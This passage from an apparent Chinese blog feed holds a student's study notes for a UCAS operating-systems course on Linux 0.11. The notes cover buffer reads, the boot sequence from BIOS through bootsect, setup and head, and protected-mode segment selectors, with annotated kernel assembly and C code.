class=&#34;comment&#34;&gt; * bread() reads a specified block and returns the buffer that contains&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * it. It returns NULL if the block was unreadable.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; buffer_head * &lt;span class=&#34;title function_&#34;&gt;bread&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dev,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; block)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;buffer_head&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;bh&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!(bh=getblk(dev,block))) &lt;span class=&#34;comment&#34;&gt;//找不到就应该继续等,所以不应该为空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		panic(&lt;span class=&#34;string&#34;&gt;&amp;quot;bread: getblk returned NULL\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bh-&amp;gt;b_uptodate)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; bh;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ll_rw_block(READ,bh); &lt;span class=&#34;comment&#34;&gt;//开始读写硬盘了,硬盘驱动&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	wait_on_buffer(bh);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (bh-&amp;gt;b_uptodate)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; bh;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	brelse(bh);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;36、getblk（）函数中，两次调用wait-on-buffer（）函数，两次的意思一样吗？&#34;&gt;&lt;a href=&#34;#36、getblk（）函数中，两次调用wait-on-buffer（）函数，两次的意思一样吗？&#34; class=&#34;headerlink&#34; title=&#34;36、getblk（）函数中，两次调用wait_on_buffer（）函数，两次的意思一样吗？&#34;&gt;&lt;/a&gt;36、getblk（）函数中，两次调用wait_on_buffer（）函数，两次的意思一样吗？&lt;/h1&gt;&lt;p&gt;p125 bread里面一次&lt;/p&gt;
&lt;h1 id=&#34;37、getblk（）函数中-do-if-tmp-gt-b-count-continue-if-bh-BADNESS-tmp-lt-BADNESS-bh-bh-x3D-tmp-if-BADNESS-tmp-break-x2F-and-repeat-until-we-find-something-good-x2F-while-tmp-x3D-tmp-gt-b-next-free-x3D-free-list-说明什么情况下执行continue、break。&#34;&gt;&lt;a href=&#34;#37、getblk（）函数中-do-if-tmp-gt-b-count-continue-if-bh-BADNESS-tmp-lt-BADNESS-bh-bh-x3D-tmp-if-BADNESS-tmp-break-x2F-and-repeat-until-we-find-something-good-x2F-while-tmp-x3D-tmp-gt-b-next-free-x3D-free-list-说明什么情况下执行continue、break。&#34; class=&#34;headerlink&#34; title=&#34;37、getblk（）函数中    do {        if (tmp-&amp;gt;b_count)            continue;        if (!bh || BADNESS(tmp)&amp;lt;BADNESS(bh)) {            bh &amp;#x3D; tmp;            if (!BADNESS(tmp))                break;        }&amp;#x2F;* and repeat until we find something good *&amp;#x2F;    } while ((tmp &amp;#x3D; tmp-&amp;gt;b_next_free) !&amp;#x3D; free_list);说明什么情况下执行continue、break。&#34;&gt;&lt;/a&gt;37、getblk（）函数中    do {        if (tmp-&amp;gt;b_count)            continue;        if (!bh || BADNESS(tmp)&amp;lt;BADNESS(bh)) {            bh &amp;#x3D; tmp;            if (!BADNESS(tmp))                break;        }&amp;#x2F;* and repeat until we find something good *&amp;#x2F;    } while ((tmp &amp;#x3D; tmp-&amp;gt;b_next_free) !&amp;#x3D; free_list);说明什么情况下执行continue、break。&lt;/h1&gt;&lt;h1 id=&#34;38、make-request（）函数-if-req-lt-request-if-rw-ahead-unlock-buffer-bh-return-sleep-on-amp-wait-for-request-goto-repeat&#34;&gt;&lt;a href=&#34;#38、make-request（）函数-if-req-lt-request-if-rw-ahead-unlock-buffer-bh-return-sleep-on-amp-wait-for-request-goto-repeat&#34; class=&#34;headerlink&#34; title=&#34;38、make_request（）函数        if (req &amp;lt; request) {        if (rw_ahead) {            unlock_buffer(bh);            return;        }        sleep_on(&amp;amp;wait_for_request);        goto repeat;&#34;&gt;&lt;/a&gt;38、make_request（）函数        if (req &amp;lt; request) {        if (rw_ahead) {            unlock_buffer(bh);            return;        }        sleep_on(&amp;amp;wait_for_request);        goto repeat;&lt;/h1&gt;&lt;h1 id=&#34;其中的sleep-on-amp-wait-for-request-是谁在等？等什么？&#34;&gt;&lt;a href=&#34;#其中的sleep-on-amp-wait-for-request-是谁在等？等什么？&#34; class=&#34;headerlink&#34; title=&#34;其中的sleep_on(&amp;amp;wait_for_request)是谁在等？等什么？&#34;&gt;&lt;/a&gt;其中的sleep_on(&amp;amp;wait_for_request)是谁在等？等什么？&lt;/h1&gt;&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;p&gt;《Linux内核设计的艺术 第二版》 新设计团队&lt;/p&gt;
&lt;p&gt;《Linux内核完全注释》 赵炯&lt;/p&gt;
&lt;p&gt;《IA32》 手册 第三卷&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.likecs.com/show-204742912.html&#34;&gt;https://www.likecs.com/show-204742912.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/sunym1993/flash-linux0.11-talk&#34;&gt;https://github.com/sunym1993/flash-linux0.11-talk&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2022-11-14T03:01:59.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/</id>
        <title>ucas-操作系统-思考题上</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/"/>
        <content type="html">&lt;h1 id=&#34;思考题-上&#34;&gt;&lt;a href=&#34;#思考题-上&#34; class=&#34;headerlink&#34; title=&#34;思考题 上&#34;&gt;&lt;/a&gt;思考题 上&lt;/h1&gt;&lt;h1 id=&#34;1-为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？&#34;&gt;&lt;a href=&#34;#1-为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？&#34; class=&#34;headerlink&#34; title=&#34;1.为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？&#34;&gt;&lt;/a&gt;1.为什么开始启动计算机的时候，执行的是BIOS代码而不是操作系统自身的代码？&lt;/h1&gt;&lt;p&gt;p1&lt;/p&gt;
&lt;p&gt;因为在启动加电时,操作系统本身还没有加载进内存,内存中是空的(或者说乱七八糟的东西?),无法进行执行.(CPU的逻辑电路被设定为只能运行内存中的程序) 而bios中的代码是写死的,所以可以直接跳转到biso处进行执行.&lt;/p&gt;
&lt;h1 id=&#34;2-为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？&#34;&gt;&lt;a href=&#34;#2-为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？&#34; class=&#34;headerlink&#34; title=&#34;2.为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？&#34;&gt;&lt;/a&gt;2.为什么BIOS只加载了一个扇区，后续扇区却是由bootsect代码加载？为什么BIOS没有直接把所有需要加载的扇区都加载？&lt;/h1&gt;&lt;p&gt;加载了一个扇区之后,操作系统就有能力继续加载后续的扇区了,这样做的原因大概是为了减小bios的大小? 或者提高速度? 或者给操作系统设计者更大的自由空间?&lt;/p&gt;
&lt;p&gt;bootsect需要进行规划内存,(为啥bios不能规划呢? 因为取决于操作系统?不同的操作系统不一样),进行一些自定义的内容. 而且bios来的话,应该是比较慢的,全加载进去再执行的话,一个是慢,还有就是不灵活.所以linux采用的是边加载边执行的思路! &lt;/p&gt;
&lt;p&gt;上面的回答大概应该都有一点&lt;/p&gt;
&lt;h1 id=&#34;3-为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？&#34;&gt;&lt;a href=&#34;#3-为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？&#34; class=&#34;headerlink&#34; title=&#34;3.为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？&#34;&gt;&lt;/a&gt;3.为什么BIOS把bootsect加载到0x07c00，而不是0x00000？加载后又马上挪到0x90000处，是何道理？为什么不一次加载到位？&lt;/h1&gt;&lt;p&gt;p8&lt;/p&gt;
&lt;p&gt;感觉这就是个约定问题,就好像12345这样一样&lt;/p&gt;
&lt;p&gt;挪到0x90000是因为操作系统设计者对内存的规划,原先加载到0x07c00是统一的,之后可以按照自己的分配来进行&lt;/p&gt;
&lt;h1 id=&#34;4-bootsect、setup、head程序之间是怎么衔接的？给出代码证据。&#34;&gt;&lt;a href=&#34;#4-bootsect、setup、head程序之间是怎么衔接的？给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;4.bootsect、setup、head程序之间是怎么衔接的？给出代码证据。&#34;&gt;&lt;/a&gt;4.bootsect、setup、head程序之间是怎么衔接的？给出代码证据。&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled1.png&#34; alt=&#34;Untitled1&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;bootsect和setup的衔接&#34;&gt;&lt;a href=&#34;#bootsect和setup的衔接&#34; class=&#34;headerlink&#34; title=&#34;bootsect和setup的衔接&#34;&gt;&lt;/a&gt;bootsect和setup的衔接&lt;/h2&gt;&lt;p&gt;bootsect 把自己移位,然后先把setup加载到0x90200开始的四个扇区,又把从硬盘第 6 个扇区开始往后的 240 个扇区，加载到内存 0x10000 处&lt;/p&gt;
&lt;p&gt;然后通过下面这条指令跳转到setup&lt;/p&gt;
&lt;p&gt;jmpi	0,SETUPSEG; 0x9020 跳转到setup.s开始继续执行了!!! (此时还是实模式, 偏移地址+ 基地址, 0+ 0x9020*0x10 &amp;#x3D; 0x90200&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;;移位&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;entry start &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;start: 					;内存中&lt;span class=&#34;number&#34;&gt;0x07C00&lt;/span&gt;对应的就是这里&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ax,#BOOTSEG  ;&lt;span class=&#34;number&#34;&gt;0x07C00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ds,ax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ax,#INITSEG  ;&lt;span class=&#34;number&#34;&gt;0x9000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	es,ax        ;进行复制,挪位置,把&lt;span class=&#34;number&#34;&gt;0x07c00&lt;/span&gt; 挪到&lt;span class=&#34;number&#34;&gt;0x9000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	cx,#&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sub	si,si&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sub	di,di&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	rep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movw        ;移动一个字 两个字节  &lt;span class=&#34;number&#34;&gt;512&lt;/span&gt; /&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-256&lt;/span&gt;次&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jmpi	go,INITSEG ; 跳到新的位置,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;加载setup.s的四个扇区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;load_setup: ; 加载&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;个扇区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	dx,#&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;		! drive &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, head &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	cx,#&lt;span class=&#34;number&#34;&gt;0x0002&lt;/span&gt;		! sector &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, track &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	bx,#&lt;span class=&#34;number&#34;&gt;0x0200&lt;/span&gt;		! address = &lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;, in INITSEG&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ax,#&lt;span class=&#34;number&#34;&gt;0x0200&lt;/span&gt;+SETUPLEN	! service &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, nr of sectors&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt;			! read it  bios的中断,读取磁盘&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jnc	ok_load_setup		! ok - &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	dx,#&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ax,#&lt;span class=&#34;number&#34;&gt;0x0000&lt;/span&gt;		! reset the diskette&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	j	load_setup&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;加载head和剩余的操作系统&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ok_load_setup:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;! 把从硬盘第 &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt; 个扇区开始往后的 &lt;span class=&#34;number&#34;&gt;240&lt;/span&gt; 个扇区，加载到内存 &lt;span class=&#34;number&#34;&gt;0x10000&lt;/span&gt; 处&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ax,#SYSSEG。;&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	es,ax		! segment of &lt;span class=&#34;number&#34;&gt;0x010000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call	read_it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call	kill_motor&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	seg cs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	ax,root_dev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmp	ax,#&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne	root_defined&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;;跳转到setup.s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root_defined:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	seg cs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov	root_dev,ax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jmpi	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SETUPSEG; &lt;span class=&#34;number&#34;&gt;0x9020&lt;/span&gt; 跳转到setup.s开始继续执行了!!!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;setup-s和head-s的衔接&#34;&gt;&lt;a href=&#34;#setup-s和head-s的衔接&#34; class=&#34;headerlink&#34; title=&#34;setup.s和head.s的衔接&#34;&gt;&lt;/a&gt;setup.s和head.s的衔接&lt;/h2&gt;&lt;p&gt;1.setup.s把head.s及之后的代码都移动到了内存0开始的地方(do_move)&lt;/p&gt;
&lt;p&gt;2.设置gdt、ldt(end_move)&lt;/p&gt;
&lt;p&gt;3.开保护模式, jmpi 0,8 跳转到了head.s&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov	ax,#&lt;span class=&#34;number&#34;&gt;0x0001&lt;/span&gt;	! protected &lt;span class=&#34;title function_&#34;&gt;mode&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(PE)&lt;/span&gt; bit。 保护模式. PE,不是任何人都可以修改&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lmsw	ax		! This is it!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmpi	0,8		! jmp offset 0 of segment 8 &lt;span class=&#34;params&#34;&gt;(cs)&lt;/span&gt;  gdt的1项, 0开始编号,第二项&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;5-setup程序的最后是jmpi-0-8-，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？&#34;&gt;&lt;a href=&#34;#5-setup程序的最后是jmpi-0-8-，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？&#34; class=&#34;headerlink&#34; title=&#34;5.setup程序的最后是jmpi 0,8 ，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？&#34;&gt;&lt;/a&gt;5.setup程序的最后是jmpi 0,8 ，为什么这个8不能简单的当作阿拉伯数字8看待，究竟有什么内涵？&lt;/h1&gt;&lt;p&gt;p25&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/S5zarr9BmLhUHAmdmeNypA&#34;&gt;https://mp.weixin.qq.com/s/S5zarr9BmLhUHAmdmeNypA&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mov ax,#&lt;span class=&#34;number&#34;&gt;0x0001&lt;/span&gt;  ; protected &lt;span class=&#34;title function_&#34;&gt;mode&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(PE)&lt;/span&gt; bit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lmsw ax      ; This is it;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmpi	&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;	! jmp offset &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; of segment &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; (cs) gdt的&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;项, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;开始编号,第二项&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在执行这条指令前已经转变为了保护模式, 保护模式的寻址方式变了,需要通过段选择子,段寄存器中存储的不再是地址,而是段选择子&lt;/p&gt;
&lt;p&gt;0 表示段内偏移地址, 8代表cs(代码段)的值, 更具体而言,8是 0000,0000,0000,1000&lt;/p&gt;
&lt;p&gt;根据下图段选择子的结构可以看出,1是代表了描述符索引,即gdt表的第一项,也就是现在地址的0!&lt;/p&gt;
&lt;p&gt;gdt表在此之前已经初始化过,第一项是内核代码段,base address &amp;#x3D; 0 , 偏移地址也是0,所以跳转到内存的0地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled2.png&#34; alt=&#34;Untitled2&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled3.png&#34; alt=&#34;Untitled3&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span 